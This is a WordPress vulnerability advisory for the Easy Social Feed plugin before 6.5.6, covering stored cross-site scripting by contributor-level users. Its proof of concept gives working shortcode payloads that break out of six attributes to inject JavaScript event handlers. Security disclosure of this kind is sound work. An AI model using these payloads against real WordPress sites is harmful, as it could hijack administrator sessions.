## WordPress Plugin Vulnerabilities

# Easy Social Feed < 6.5.6 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in the page, which could allow users with a role as low as contributor to perform Stored Cross-Site Scripting attacks which could be used against high privilege users such as admin

### Proof of Concept

Attributes fb\_appid and locale (fixed in 6.5.4):
[efb\_likebox fb\_appid='1234"; alert(/fb\_appid/); asd ="' locale='1234"; alert(/locale/); asd ="']
Attribute animate\_effect:
[efb\_likebox animate\_effect='1234" onmouseover="alert(/animate\_effect/)" style="height: 50px; border-style: solid" "']
Attribute fanpage\_url:
[efb\_likebox fanpage\_url='http://example.com/awesome/page/" onmouseover=alert("fanpage\_url") style="height: 50px; border-style: solid" "']
Attribute box\_width:
[efb\_likebox box\_width='1234" onmouseover="alert(/box\_width/)" style="height: 50px; border-style: solid" "']
Attribute box\_height:
[efb\_likebox box\_height='1234" onmouseover="alert(/box\_height/)" style="height: 50px; border-style: solid" "']
